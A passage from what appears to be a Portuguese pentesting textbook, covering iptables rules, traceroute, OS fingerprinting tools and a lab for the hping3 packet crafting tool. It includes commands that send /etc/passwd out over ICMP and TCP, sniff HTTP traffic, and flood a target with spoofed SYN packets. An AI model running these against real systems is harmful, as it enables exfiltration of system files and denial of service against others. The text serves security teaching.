t\tfilter\t–s\t127.0.0.1\t–d\t192.168.1.102\t–p\ttcp\t--dport\t80\t–j\tDROP\n•\tTodo\ttráfego\tque\tchegar\tcom\tdestino\tao\tIP\t192.168.1.102\tpelo\tprotocolo\nTCP\té\tbloqueado,\tcom\texceção\tao\ttráfego\tvindo\tdo\tIP\t192.168.1.100:\niptables\t–A\tINPUT\t–t\tfilter\t-d\t192.168.1.102\t–p\ttcp\t–j\tDROP\t!\t–s\t192.168.1.100\n•\tFaz\to\tredirecionamento\tda\tporta\t80\tpara\ta\tporta\t81:iptables\t-t\tnat\t-A\tPREROUTING\t-i\teth0\t-p\ttcp\t--dport\t80\t-j\tREDIRECT\t--to-port\t81\n•\tDeletar\ta\tregra\tde\tnúmero\t\nnum\n:\niptables\t–D\tINPUT\t1\t\tDeleta\ta\tprimeira\tregra\tda\tchain\tINPUT\tda\ttabela\tFilter.\niptables\t–t\tnat\t-D\tPREROUTING\t1\t\tDeleta\ta\tprimeira\tregra\tda\tchain\tPREROUTING\tda\ttabela\tNAT.\n•\tApagar\ttodas\tas\tregras:\niptables\t–F\t\tDeleta\ttodas\tas\tregras\tda\ttabela\tFilter.\niptables\t–F\t–t\tnat\t\t\t\tDeleta\ttodas\tas\tregras\tda\ttabela\tNAT.\n•\tInserir\ta\tprimeira\tregra\tna\ttabela\tFilter\tna\tchain\tOUTPUT:\niptables\t–I\tOUTPUT\t1\t–d\t127.0.0.1\t–j\tDROP\n5.6\tInformações\tde\trota\nOs\tdados\tque\ttrafegam\tda\tsua\tmáquina\taté\ta\tmáquina\tdestino\tpassam\tpor\nroteadores,\tque\tdeterminarão\ta\tmelhor\trota\tentre\torigem\te\tdestino.\tAlgumas\nferramentas\tnos\tauxiliam\ta\tver\tquais\tsão\tos\tlugares\tpor\tonde\to\tpacote\tpassa\taté\nchegar\tao\tseu\tdestino.\n5.6.1\tTraceroute\nO\tTraceroute\té\tuma\tferramenta\tque\tdefine\to\troteamento\tde\tpacotes\tutilizando\to\nprotocolo\tICMP.\tEnquanto\to\tping\tapenas\tenvia\tum\tpacote\tICMP\tpara\ndeterminado\thost\tpara\tverificar\tse\teste\tse\tencontra\tativo\te\trespondendo\tpor\npacotes\tICMP,\to\tTraceroute\tconsegue\tdeterminar\ta\trota\tde\tdados.\nSeu\tfuncionamento\testá\tbaseado\tno\tuso\tdo\tcampo\tTTL\t(Time-To-Live)\tdo\npacote\tIPv4.\tEste\tvalor\té\tdecrementado\tcada\tvez\tque\to\tpacote\tpassa\tpor\tum\nsalto.\nOpções:\n-I\nEnvia\tpacotes\tICMP\tEcho\tRequest\t(método\ttradicional).\n-T\nEnvia\tpacotes\tTCP\tSYN\t(usado\tpara\tburlar\tregras\tde\tfirewall).\n-U\nEnvia\tpacotes\tUDP\t(usado\tpara\tburlar\tregras\tde\tfirewall).\nExemplos:\nroot@kali#\n\ttraceroute\t192.168.1.102\nroot@kali#\n\ttraceroute\t–I\t192.168.1.102\nroot@kali#\n\ttraceroute\t–T\t192.168.1.102root@kali#\n\ttraceroute\t–U\t192.168.1.102\n•\tMude\tas\tregras\tdo\tiptables\tno\tDebian\tpara:\nroot@debian#\n\tiptables\t–F\nroot@debian#\n\tiptables\t–A\tOUTPUT\t–p\ticmp\t–j\tDROP\n•\tRealize\to\tTraceroute\tnovamente\tno\tKali\tLinux:\nroot@kali#\n\ttraceroute\t192.168.1.102\nAplicando\tuma\tregra\tde\tDROP\tsobre\to\tprotocolo\tICMP,\to\tTraceroute\tnão\tconsegue\tmais\ttraçar\ta\trota\n(o\tTraceroute\tutiliza\to\tprotocolo\tICMP\tpara\tdeterminação\tda\trota).\n•\tMude\tas\tregras\tdo\tiptables\tno\tDebian\tpara:\nroot@debian#\n\tiptables\t–F\nroot@debian#\n\tiptables\t–A\tINPUT\t–p\ttcp\t–j\tDROP\n•\tRealize\to\tTraceroute\tnovamente\tno\tKali\tLinux:\nroot@kali#\n\ttraceroute\t–T\t192.168.1.102\nO\ttráfego\té\tbloqueado,\tpois\tutilizamos\tuma\tregra\tde\tDROP\tsobre\to\tprotocolo\tTCP\t(lembre-se\tde\tque\nestamos\tutilizando\ta\topção\t-T\tdo\tTraceroute).\nPara\tcada\tregra\tdo\tiptables,\to\tTraceroute\tapresentou\tum\tresultado\tdiferente,\nconseguindo\tou\tnão\tenviar\tpacotes\tao\tdestino.\n5.6.2\tTCPtraceroute\nA\tferramenta\tTCPtraceroute\ttem\ta\tmesma\tfinalidade\tque\to\tTraceroute.\tA\túnica\ndiferença\tentre\tas\tduas\tferramentas\té\tque\tenquanto\to\tTraceroute\tdefine\to\nroteamento\tde\tdados\tpor\tmeio\tdo\tprotocolo\tICMP\t(facilmente\tbloqueável\tpelo\niptables\tou\tpor\tqualquer\toutro\ttipo\tde\tfirewall),\to\tTCPtraceroute\tdefine\to\nroteamento\tde\tdados\tenviando\trequisições\tSYN/ACK\tpara\tuma\tdeterminada\nporta\tpor\tmeio\tdo\tprotocolo\tTCP/IP.\nO\tTCPtraceroute\treceberá\t\n<syn,ack>\n\tse\ta\tporta\testiver\taberta,\te\t\n<rst,ack>\n\tse\testiver\nfechada.\n•\tDelete\tas\tregras\tdo\tiptables:\nroot@debian#\n\tiptables\t–F\n•\tInicie\to\tservidor\tApache:\nroot@debian#\n\tservice\tapache2\tstart\n•\tUtilize\to\tTCPtraceroute\tenviando\tum\tpacote\taté\ta\tporta\t80\t(nesse\tmomento\taporta\tencontra-se\taberta):\nroot@kali#\n\ttcptraceroute\t192.168.1.102\t80\nObserve\tque\ta\tresposta\tserá\t\n<syn,ack>\n:\ntraceroute\tto\t192.168.1.102\t(192.168.1.102),\t30\thops\tmax,\t60\tbyte\tpackets\n1\t\tDebian\t(192.168.1.102)\t<syn,ack>\t1000.969\tms\t1400.148\tms\t1000.761\tms\n•\tFinalize\to\tserviço\tde\tweb\tno\tDebian:\nroot@debian#\n\tservice\tapache2\tstop\n•\tUtilize\to\tTCPtraceroute\tenviando\tum\tpacote\taté\ta\tporta\t80\t(nesse\tmomento\nencontra-se\tfechada):\nroot@kali#\n\ttcptraceroute\t192.168.1.102\t80\nObserve\tque\ta\tresposta\tserá\t\n<rst,ack>\n:\ntraceroute\tto\t192.168.1.102\t(192.168.1.102),\t30\thops\tmax,\t60\tbyte\tpackets\n1\t\tDebian\t(192.168.1.102)\t<\nrst,ack\n>\t2.512\tms\t2.461\tms\t2.433\tms\n1\n\tTécnica\tpara\tbalanceamento\tde\tcarga.\tNormalmente\té\tutilizado\tmais\tde\tum\tendereço\tIP\tpara\tdividir\tum\nnúmero\tmuito\tgrande\tde\tpedidos\tde\tconexões\tàquele\tdestino.\tLeia\to\titem\t6.2.1\tpara\tmais\tdetalhes.CAPÍTULO\n\t6\nFingerprinting\nApós\trealizado\to\tprocesso\tde\tcoleta\tde\tinformações\t(ou\tfootpriting)\tsobre\ta\trede\nalvo,\ttais\tcomo\ttopologia,\tservidores\tDNS,\tanálise\tde\trota,\té\tnecessário\ndescobrir\tqual\té\ta\tversão\tdo\tsistema\toperacional\tdas\tmáquinas\tque\testão\tna\trede.\nSabendo\tquais\tsão\tas\tmáquinas\tativas\tna\trede\te\tqual\ta\tversão\tde\tseu\tsistema\noperacional,\té\tpossível\tescolher\tos\texploits\tadequados.\nA\tetapa\tde\tfingerprinting\tpode\tser\tcategorizada\tem\tpassivo\tou\tativo:\n•\t\nPassivo\n\t–\tNeste\ttipo\tde\tvarredura\té\tescutado\tpor\tconexões\tda\trede\tde\tforma\npassiva,\tnormalmente\texecutando\talgum\tserviço\te\tesperando\tpor\tconexões.\n•\t\nAtivo\n\t–\tNesse\ttipo\tde\tvarredura\tsão\tenviados\tpacotes\tpara\ta\tmáquina\tque\tse\nqueira\tdeterminar\ta\tversão\tdo\tsistema\toperacional.\n6.1\tFingerprinting\tpassivo\nFerramentas\tde\tfingerprinting\tpassivo\tapenas\tficam\tesperando\tpor\tconexões.\tNo\nmomento\tem\tque\té\testabelecida\tuma\tconexão\t(da\tmáquina\talvo\tpara\ta\tmáquina\natacante),\ta\tferramenta\tcompara\tos\tdados\trecebidos\tcom\tuma\tbase\tde\tdados.\nAssim,\tdados\tiguais\trepresentam\tdeterminado\tsistema\toperacional.\tEsse\ttipo\tde\nteste\t“voa\tmais\tbaixo\tno\tradar”\te\tcom\tcerteza\té\tmais\tsilencioso\tdo\tque\to\nfingerprinting\tativo.\n6.1.1\tP0f\nO\tp0f\té\tuma\tferramenta\tpara\to\tfingerprinting\tpassivo,\tesperando\tpor\tconexões\te\ndeterminando\ta\tversão\tdo\tsistema\toperacional\tdaquela\tmáquina.\nOpção:\n-i\t\niface\nDetermina\tqual\tinterface\tserá\tutilizada.\tPor\tpadrão\té\ta\t\neth0\n.\nExemplo:\nroot@kali#\t\nservice\tapache2\tstart\nroot@kali#\t\np0f\t–i\teth0Com\toutra\tmáquina\t(por\texemplo,\tWindows\t7),\tconecte\tno\tservidor\tweb\tdo\tKali\nLinux.\tO\tfingerprinting\tdo\tWindows\tserá\tdeterminado.\n[+]\tClosed\t2\tfile\tdescriptors.\n[+]\tLoaded\t320\tsignatures\tfrom\t'p0f.fp'.\n[+]\tIntercepting\ttraffic\ton\tinterface\t'wlan0'.\n[+]\tDefault\tpacket\tfiltering\tconfigured\t[+VLAN].\n[+]\tEntered\tmain\tevent\tloop.\n.-[\t192.168.1.101/1049\t->\t192.168.1.100/80\t(syn)\t]-\n|\tclient\t=\t192.168.1.101/1049\n|\tos\t=\tWindows\t7\tor\t8\n|\tdist\t=\t0\n|\tparams\t=\tnone\n|\traw_sig\t=\t4:128+0:0:1460:8192,8:mss,nop,ws,nop,nop,sok:df,id+:0\n6.2\tFingerprinting\tativo\nFerramentas\tde\tcoleta\tde\tinformação\tativas\tcom\tcerteza\tsão\tem\tmaior\tnúmero\ndo\tque\tas\tpassivas.\tEmbora\tsejam\tmais\tvisíveis\ta\tsistema\tde\tdefesas\t(como\tum\nbom\tfirewall\te/ou\tIDS\t–\tsistema\tde\tdetecção\tde\tintruso)\tdo\tque\tas\tferramentas\npassivas,\ta\tcoleta\tativa\ttambém\té\tnecessária.\n6.2.1\tPing\nO\tping\tenvia\tum\tpacote\tICMP\tEcho\tRequest\tao\thost\talvo.\tSe\to\thost\testiver\tativo\ne\tnão\testiver\tsendo\tbloqueado\tpor\tregras\tde\tfirewall,\tresponderá\tcom\tICMP\nEcho\tReply.\nroot@kali#\n\tping\t192.168.1.102\nPor\tmeio\tdo\tping\tem\tconjunto\tcom\to\tTraceroute\té\tpossível\ta\tdeterminação\tdo\nsistema\toperacional,\tdevido\tao\tTTL\t(Time-To-Live).\tCada\tsistema\toperacional\ntem\tum\tTTL\tque\té\tdecrementado\ta\tcada\tvez\tque\tpassa\tpor\tum\tsalto.\nOriginalmente,\tos\tTTL\tdos\tprincipais\tsistemas\toperacionais\tsão:\nLinux\n64\nWindows\n128\nUnix\n255\nEnvie\tum\tping\tpara\tum\tsite:\nroot@kali#\n\tping\twww.google.com.br\t-c\t1A\tresposta\tserá\talgo\tparecido\tcom:\nPING\twww.google.com.br\t(173.194.119.31)\t56(84)\tbytes\tof\tdata.\n64\tbytes\tfrom\trio01s07-in-f31.1e100.net\t(173.194.119.31):\ticmp_req=1\t\nttl=53\n\ttime=52.4\tms\n---\twww.google.com.br\tping\tstatistics\t---\n1\tpackets\ttransmitted,\t1\treceived,\t0%\tpacket\tloss,\ttime\t0ms\nrtt\tmin/avg/max/mdev\t=\t52.475/52.475/52.475/0.000\tms\nNo\texemplo\tcom\to\tping,\to\tTTL\testá\tmarcado\tcomo\tsendo\t53,\tindicando\ndecremento\tdo\tTTL,\tou\tseja,\to\tnosso\tpacote\tpassou\tpor\talguns\troteadores\tantes\nde\tchegar\tao\tseu\tdestino\tfinal.\nExecute\to\tTraceroute\tpara\tesse\tsite,\tpara\tconfirmar\tquais\tsão\tos\tcaminhos\tque\to\nnosso\tpacote\tpassa\tantes\tde\tser\tentregue\tao\tdestino\tfinal.\nroot@kali#\n\ttracetroute\twww.google.com.br\nA\tresposta\tserá\t(editado\tpor\tmotivos\tvisuais):\n1\t\t192.168.1.1\t(192.168.1.1)\t\t5.117\tms\t\t5.028\tms\t\t5.006\tms\n2\t\t*\t*\t*\n.\n.\n.\n12\t\trio01s07-in-f15.1e100.net\t(173.194.119.15)\t\t50.224\tms\t\t58.284\tms\t\t45.276\tms\nO\túltimo\tsalto\té\to\t12,\tindicando\tque\thá\t12\tmáquinas\tentre\ta\torigem\te\to\tdestino.\nDessa\tforma,\to\tfingerprinting\tserá\t53\t(TTL)\t+\t12\t(Último\tsalto)\t=\t65,\tindicando\nque\ta\tmáquina\testá\trodando\talgum\tservidor\tLinux.\nEm\tdeterminadas\tsituações,\trealizar\tum\tping\tou\tTraceroute\tpara\ttraçar\ta\trota\taté\no\talvo\tpode\tindicar\tum\tendereço\tIP\tde\tdestino\tdiferente\tpara\tcada\trequisição.\nMuito\tprovavelmente\to\tseu\talvo\testá\tutilizando\tload\tbalance\t(balanceamento\tde\ncarga),\tque\té\tuma\ttécnica\tpara\tdistribuição\tde\trequisições\tque\tsão\tenviadas\taté\to\ndestino.\tPor\texemplo,\to\tsite\tABC\tpossui\tload\tbalance\tcom\to\tsite\tDEF,\tassim,\tse\no\tsite\tABC\treceber\tmuitas\trequisições,\tum\tpouco\tdo\tfluxo\tde\tdados\tpode\tser\ndirecionado\tpara\tDEF.\tO\tGoogle\té\tum\texemplo\tde\tsite\tque\tutiliza\to\tload\nbalance.\tVerifique\tse\to\tdomínio\tque\testá\tsendo\ttestado\tpossui\tbalanceamento\tde\ncarga\tcom\to\tcomando\t\nlbd\n.\nroot@kali#\n\tlbd\twww.site.com.br\n6.2.2\tFping\nO\tfping\té\tuma\tferramenta\tusada\tpara\tenvio\tde\tICMP\tEcho\tRequest\tpara\tvárioshosts\tao\tmesmo\ttempo\t(no\tping\té\tenviado\tsomente\tpara\tum\thost).\tCaso\to\thost\nresponda\tcom\tICMP\tEcho\tReply,\tsignifica\tque\to\thost\testá\tonline,\te\tsão\texibidas\ninformações\ta\trespeito\tdo\tpacote\tICMP.\tCaso\tcontrário,\té\texibida\tuma\nmensagem\tde\t\nunrechable\n.\nOpções:\n-c\t\ncount\nLimita\ta\tquantidade\tde\tpacotes\tque\tserão\tenviados.\n-g\n\tIPs\nDetermina\ta\tfaixa\tde\tIPs.\nPor\tpadrão\tsão\texibidos\tna\ttela\tos\thosts\tque\testão\toffline:\nroot@kali#\n\tfping\t192.168.1.102\nO\tfping\ttambém\tpode\tser\tusado\tpara\tenviar\tum\tpacote\tICMP\tEcho\tRequest\tpara\nmais\tde\tuma\tmáquina:\nroot@kali#\n\tfping\t192.168.1.1\t192.168.1.100\t192.168.1.102\n\t\nDica:\n\tpara\tevitar\tque\tsejam\texibidas\tna\ttela\ttodas\tas\tmensagens,\tenvie\tas\tmensagens\tde\terro\tpara\n/dev/null\n.\n\t\nroot@kali#\n\tfping\t–c\t1\t–g\t192.168.1.0/24\t2>\t/dev/null\n6.2.3\tArping\nO\tarping\té\tuma\tferramenta\tutilizada\tcomo\tum\t“ping”\tapenas\tpara\ta\trede\tlocal.\nIsso\tporque\to\tarping\tutiliza\to\tprotocolo\tARP\tREQUEST\tcomo\tprotocolo\tde\nrequisição\t(protocolo\troteável\tapenas\tpara\tLAN,\tsegundo\to\tmodelo\tOSI).\tComo\nopera\tna\tcamada\t2\tdo\tmodelo\tOSI,\tele\tnão\tsai\tatravés\tde\troteadores\tou\ngateways.\nroot@kali#\n\tarping\t192.168.1.102\n6.2.4\tNetdiscover\nSimilar\tà\tferramenta\tArping,\tporém\té\tpossível\tenviar\tpacotes\tARP\tREQUEST\npara\tuma\tfaixa\tde\tIPs.\nOpções:\n-r\nDetermina\ta\tfaixa\tde\tIPs.\n-i\t\niface\nDetermina\tqual\tinterface\tserá\tutilizada.\tPor\tpadrão\té\ta\t\neth0\n.Exemplo:\nroot@kali#\n\tnetdiscover\t–r\t192.168.1.0/24\t–i\teth0\n6.2.5\tHping3\nO\thping3\té\tum\tgerador\tde\tpacotes.\tCom\tele\té\tpossível\tdetectar\thosts\tativos,\nregras\tde\tfirewall,\tvarreduras\tde\tportas,\ttestar\to\tdesempenho\tda\trede,\nfragmentação\tde\tpacotes,\tTOS,\tfingerprinting\tetc.\tSuporta\tdiversos\tprotocolos\ncomo\tTCP,\tUDP,\tICMP\tetc.\n6.2.5.1\tLaboratório\tcom\thping3\nCaso\tdeseje,\tinstale\to\thping3\tno\tDebian\tcom\to\tcomando\t\napt-get\tinstall\thping3\n.\n1\n.\tEnviando\tpacotes\tICMP\tEcho\tRequest\nroot@debian#\n\tiptables\t-F\tLimpe\tas\tregras\tdo\tiptables.\nroot@kali#\n\thping3\t192.168.1.102\t-1\tO\tpacote\té\tenviado\tnormalmente\tpara\to\tservidor\tDebian.\nroot@debian#\n\tiptables\t–A\tINPUT\t–p\ticmp\t–j\tREJECT\tInsira\tuma\tregra\tde\tREJECT.\nroot@kali#\n\thping3\t192.168.1.102\t-1\tO\tpacote\té\tbloqueado\tpelo\tfirewall.\n2\n.\tLimitando\to\tnúmero\tde\tpacotes\nroot@debian#\t\niptables\t–F\nroot@kali#\t\nhping3\t-1\t192.168.1.102\t\n–c\t3\n\t\t\t\tSão\tenviados\ttrês\tpacotes\tpara\to\tDebian.\n3\n.\tModificando\to\ttipo\tICMP\nroot@debian#\n\tiptables\t-F\nroot@kali#\n\thping3\t192.168.1.102\t\n–1\t–C\t8\t–K\t0\n\tICMP\tEcho\tRequest.\nroot@kali#\n\thping3\t192.168.1.102\t\n–1\t–C\t0\t–K\t0\n\tICMP\tEcho\tReply.\nroot@kali#\n\thping3\t192.168.1.102\t\n–1\t–C\t13\t–K\t0\t\nICMP\tTimestamp\tRequest.\n2\n.\tPacotes\tSYN\tpara\tuma\tporta\tespecífica\nroot@debian#\n\tiptables\t-F\nroot@kali#\n\thping3\t192.168.1.102\t\n–S\t–p\t80\n\tPorta\taberta,\tresposta\t<flags=SA>.\nroot@kali#\n\thping3\t192.168.1.102\n–S\t–p\t81\n\tPorta\tfechada,\tresposta\t<flags=RA>.\n3\n.\tPacotes\tUDP\nroot@debian#\n\tiptables\t-F\nroot@kali#\n\thping3\t192.168.1.102\t\n–2\nroot@kali#\n\thping3\t192.168.1.102\t\n–2\t–p\t54\n\tEm\tUDP,\ta\tresposta\té\tdiferente\tdo\tTCP.\tPorta\tfechada,\nresposta\t<name=UNKNOW>.\nroot@kali#\n\thping3\t192.168.1.102\t\n–2\t–p\t53\n\tPorta\taberta,\tnão\thá\tresposta.4\n.\tPort\tscanner\t(Primeiro\tmétodo)\nroot@debian#\n\tiptables\t-F\nroot@debian#\n\tservice\tapache2\tstart\nroot@kali#\n\thping3\t192.168.1.102\t-c\t3\t–S\t\n–p\t++79\n\tInicia\ta\tvarredura\ta\tpartir\tda\tporta\t79.\tPorta\taberta,\nresposta\t<flags=SA>.\nroot@debian#\n\tiptables\t–A\tINPUT\t–p\ttcp\t--dport\t80\t–j\tREJECT\nroot@kali#\n\thping3\t192.168.1.102\t-c\t3\t–S\t\n–p\t++79\n\tPorta\tfiltrada\tcom\tREJECT,\tresposta\t<ICMP\tPort\nUnreachable>.\nroot@debian#\n\tiptables\t-F\nroot@debian#\n\tiptables\t–A\tINPUT\t–p\ttcp\t--dport\t80\t–j\tDROP\nroot@kali#\n\thping3\t192.168.1.102\t-c\t3\t–S\t\n–p\t++79\n\tPorta\tfiltrada\tcom\tDROP,\tsem\tresposta.\n5\n.\tPort\tscanner\t(Segundo\tmétodo)\nroot@debian#\n\tiptables\t–F\nroot@kali#\n\thping3\t192.168.1.102\t–S\t\n--scan\t77-81\n\t\t\tRealiza\ta\tvarredura\tdas\tportas\t77\ta\t81.\n6\n.\tEnviar\tpacotes\tcom\tdeterminada\tporta\tde\torigem\nroot@debian#\n\tiptables\t-F\nroot@kali#\t\niptables\t–A\tINPUT\t–p\ttcp\t--dport\t80\t–j\tDROP\t!\t--sport\t12345\nSó\taceita\tpacotes\tse\ta\tporta\tde\torigem\tfor\t12345.\nroot@kali#\n\thping3\t192.168.1.102\t–S\t–p\t80\t\n–s\t12345\nPorta\tde\torigem\tinicia-se\tcom\t12345,\tsendo\tincrementada.\nroot@kali#\n\thping3\t192.168.1.102–S\t–p\t80\t\n–s\t12345\t-k\nPorta\tde\torigem\té\tfixada\tcomo\t12345.\n7\n.\tEnviar\tpacotes\tcom\torigem\tfalsa\t(Enviando-se\tpacotes\tcom\torigem\tfalsa\nnão\thá\tretorno\tdo\tpacote.\tEsse\tconceito\té\tmais\tbem\texplicado\tno\tcapítulo\n15,“DoS\t–\tDenial\tof\tService”).\nroot@kali#\n\thping3\t192.168.1.1\t–S\t–p\t80\t\n--spoof\t1.2.3.4\n8\n.\tEnviar\tpacotes\tcom\torigem\taleatória\nroot@debian#\n\tiptables\t-F\nroot@kali#\n\thping3\t192.168.1.102\t–S\t–p\t80\t\n--rand-source\n9\n.\tEnviar\tpacotes\tcom\tdestino\taleatório\nroot@debian#\n\tiptables\t-F\nroot@kali#\t\nhping3\t–S\t–p\t80\t\n--rand-dest\tx.x.x.x\t\n-I\teth0\n\t\t\t\tO\tcaracter\t'x'\tindica\tum\tnúmero\tqualquer.\tO\tdestino\té\ttotalmente\taleatório.\nroot@kali#\n\thping3\t–S\t–p\t80\t\n--rand-dest\t6.6.6.x\t\n-I\teth0\n\t\t\t\tO\tdestino\tserá\t6.6.6,\tsendo\to\túltimo\tdigito\tum\tdestino\taleatório.\nAs\tvarreduras\t10,\t11,\t12\te\t13\tsão\tutilizadas\tpara\tdeterminar\tse\tuma\tporta\testásob\talguma\tregra\tde\tfirewall,\te\tnão\tpara\tdeterminar\tse\tuma\tporta\testá\taberta\ne\trespondendo\tpor\tpacotes.\tPara\tmais\tdetalhes\tsobre\tregras\tde\tfirewall\te\tport\nscanners,\tconsulte\ta\tseção\t7.3,“Port\tscanner”.\n10\n.\tDeterminação\tdas\tregras\tde\tfirewall:\tACK\tscan\nroot@debian#\n\tiptables\t-F\nroot@debian#\n\tservice\tapache2\tstop\nroot@kali#\n\thping3\t192.168.102\t–p\t80\t\n-A\t\nEnvio\tda\tflag\tACK.\tPorta\tnão\tfiltrada,\tresposta\t<flags=R>.\nroot@debian#\n\tservice\tapache2\tstart\nroot@kali#\n\thping3\t192.168.102\t–p\t80\t\n–A\t\nEnvio\tda\tflag\tACK.\tPorta\tnão\tfiltrada,\tresposta\t<flags=R>.\nroot@debian#\n\tiptables\t–A\tINPUT\t–p\ttcp\t--dport\t80\t–j\tREJECT\nroot@kali#\n\thping3\t192.168.102\t–p\t80\t\n-A\t\nPorta\tfiltrada\tcom\tregra\tde\tREJECT,\tresposta\t<ICMP\tPort\nUnreachable>.\nroot@debian#\t\niptables\t-F\nroot@debian#\t\niptables\t–A\tINPUT\t–p\ttcp\t--dport\t80\t–j\tDROP\nroot@kali#\n\thping3\t192.168.102\t–p\t80\t\n-A\t\nPorta\tfiltrada\tcom\tDROP,\tsem\tresposta.\n11\n.\tDeterminação\tdas\tregras\tde\tfirewall:\tFIN\tscan\nroot@debian#\t\nservice\tapache2\tstart\nroot@debian#\n\tiptables\t-F\nroot@kali#\n\thping3\t192.168.102\t–p\t80\t\n-F\t\nEnvio\tda\tflag\tFIN.\tPorta\tnão\tfiltrada,\tsem\tresposta.\nroot@debian#\n\tiptables\t–A\tINPUT\t–p\ttcp\t--dport\t80\t–j\tREJECT\nroot@kali#\n\thping3\t192.168.102\t–p\t80\t\n-F\n\tPorta\tfiltrada\tcom\tregra\tde\tREJECT,\tresposta\t<ICMP\tPort\nUnreachable>.\nroot@debian#\t\niptables\t-F\nroot@debian#\n\tiptables\t–A\tINPUT\t–p\ttcp\t--dport\t80\t–j\tDROP\nroot@kali#\n\thping3\t192.168.102\t–p\t80\t\n-F\t\nPorta\tfiltrada\tcom\tDROP,\tsem\tresposta\t(idem\tportas\tnão\nfiltradas).\n12\n.\tDeterminação\tdas\tregras\tde\tfirewall:\tXMAS\tscan\nroot@debian#\t\nservice\tapache2\tstart\nroot@debian#\n\tiptables\t-F\nroot@debian#\n\tiptables\t–A\tINPUT\t–p\ttcp\t--dport\t80\t–j\tREJECT\nroot@kali#\n\thping3\t192.168.102\t–p\t80\t\n–X\t\nTodas\tas\tflags\tacionadas\t(FIN+PSH+URG).\tSimilar\ta\tuma\nárvore\tde\tnatal.\nroot@debian#\t\niptables\t-F\nroot@debian#\n\tiptables\t–A\tINPUT\t–p\ttcp\t--dport\t80\t–j\tDROP\nroot@kali#\n\thping3\t192.168.102\t–p\t80\t\n-X\n13\n.\tDeterminação\tdas\tregras\tde\tfirewall:\tNULL\tscan\nroot@debian#\t\nservice\tapache2\tstart\nroot@debian#\n\tiptables\t-Froot@debian#\n\tiptables\t–A\tINPUT\t–p\ttcp\t--dport\t80\t–j\tREJECT\nroot@kali#\n\thping3\t192.168.102\t–p\t80\tNenhuma\tflag\tacionada\t(NULL\tscan).\nroot@debian#\t\niptables\t-F\nroot@debian#\n\tiptables\t–A\tINPUT\t–p\ttcp\t--dport\t80\t–j\tDROP\nroot@kali#\n\thping3\t192.168.102\t–p\t80\n14\n.\tTransferência\tde\tarquivos\tvia\tICMP\n•\tMáquina\tque\tvai\treceber\tos\tdados\nroot@kali#\n\thping3\t-1\tlocalhost\t--listen\tassinatura\t–I\teth0\nA\topção\t--listen\tdefine\tque\to\thping\tfica\tlistando\tpelo\tpayload\tassinatura.\tTambém\tdeve\tser\nespecificada\ta\tinterface\tde\trede\tque\treceberá\tos\tdados.\n•\tMáquina\tque\tvai\tenviar\tos\tdados\nroot@debian#\n\thping3\t-1\t192.168.1.100\t-d\t100\t--sign\tassinatura\t--file\t/etc/passwd\nO\thping\tenvia\to\tarquivo\t/etc/passwd\tem\tblocos\tde\t100\tbytes.\n15\n.\tTransferência\tde\tarquivos\tvia\tTCP\n•\tMáquina\tque\tvai\treceber\tos\tdados\nroot@kali#\n\thping3\tlocalhost\t-p\t666\t--listen\tassinatura\t-I\teth0\n•\tMáquina\tque\tvai\tenviar\tos\tdados\nroot@debian#\n\thping3\t192.168.1.100\t-p\t666\t-d\t100\t--sign\tassinatura\t--file\t/etc/passwd\n16\n.\tSniffer\tHTTP\nroot@kali#\t\nhping3\t\n--listen\tGET\t\n-I\teth0\nAcesse\tqualquer\tsite\tque\tutilize\to\tprotocolo\tHTTP\tpara\tver\ta\tcaptura\tdos\tpacotes\tHTTP.\tNormalmente\ninterfaces\tweb\tde\troteadores\tutilizam\to\tHTTP.\n17\n.\tNegação\tde\tserviço\nroot@kali#\n\thping3\t192.168.1.1\t–S\t–p\t80\t\n--flood\nroot@kali#\n\thping3\t192.168.1.1\t–S\t–p\t80\t\n--flood\t--rand-source\n6.2.6\tXprobe2\nFerramenta\tutilizada\tpara\tdeterminação\tdo\tsistema\toperacional\tde\tmaneira\tativa,\nanalisando\tassinaturas\tdentro\tdo\tpacote\tTCP.\nroot@kali#\t\nxprobe2\t192.168.1.102\nSe\ta\tvarredura\tfor\trealizada\tsobre\tuma\tporta\tespecífica,\tmais\texato\tserá:\nroot@kali#\t\nxprobe2\t-p\ttcp:445:open\t192.168.1.101\n6.2.7\tMaltegoO\tMaltego\té\tuma\texcelente\tferramenta\tgráfica\tpara\ta\tetapa\tde\tcoleta\tde\ninformações.\tOs\tseus\tmódulos\tincluem:\tanálise\te\tvarredura\tsobre\tservidores\nDNS,\tmapeamento\tde\tIPs,\tconsulta\tde\temails,\ttelefones,\tperfil\tem\tredes\tsociais\te\ndiversos\toutros\ttipos\tde\tanálises.\nEste\tcapítulo\ttem\tcomo\tobjetivo\tensinar\to\tfuncionamento\tdo\tMaltego\te\tnão\ndescrever\ttodos\tos\tseus\tmódulos.\tPorém,\to\tleitor\tsabendo\toperar\te\tentendendo\ncomo\to\tMaltego\tfunciona,\tutilizar\te\tcombinar\tas\tdiversas\topções\toferecidas\tpelo\nMaltego\tserá\tfácil.\nInicie\to\tMaltego\tno\tKali\tLinux:\nroot@kali#\t\nmaltego\nA\tfigura\t6.1\tmostra\ta\ttela\tinicial\tdo\tMaltego.\nFigura\t6.1\t–\tTela\tinicial\tdo\tMaltego.\nRegistre-se\tpara\tpoder\tutilizá-lo\t(Figura\t6.2).\nFigura\t6.2\t–\tRegistre-se\tno\tMaltego.\nA\ttela\tde\tconfirmação\tde\tdados\té\tmostrada\tna\tfigura\t6.3.Figura\t6.3\t–\tOs\tdados\testão\tok.\nÉ\tnecessário\tescolher\tem\tquais\tservidores\to\tMaltego\tfará\ta\tsua\tcoleta\tde\ninformações\t(lembrando\tque\tas\tinformações\tobtidas\tpelo\tMaltego\tsão\ninformações\tpúblicas).\tO\tleitor\tpoderá\tescolher\ta\topção\t\nMaltego\tpublic\tservers\n(nessa\topção\to\tMaltego\tconsulta\tos\tseus\tpróprios\tservidores\tpara\tcoleta\tde\ninformações)\tou\ttambém\to\tleitor\tpoderá\tindicar\tpor\tmeio\tda\topção\t\nLocal\tTAS\n(Transform\tApplication\tServer)\n\tum\tIP\tde\talgum\tservidor\tpara\trealizar\ta\ttarefa\ndo\tMaltego\t(Figura\t6.4).\nFigura\t6.4\t–\tSelecione\tMaltego\tpublic\tservers\tpara\to\tMaltego\tconsultar\tos\tseus\nservidores.\nUma\tvez\tselecionado\tqual\ttipo\tde\tservidor\tdo\tMaltego\tfará\ta\tcoleta\tde\ninformações\t(procedimento\tchamado\tde\t\ntransform\n\tou\ttransformação),\to\tMaltego\nsolicita\tse\tvamos\tquerer\tuma\ttransformação\tpronta\t(opção\t\nRun\ta\tmachine\nNEW!!\n),\tum\tgráfico\tnovo\t(opção\t\nOpen\ta\tblank\tgrap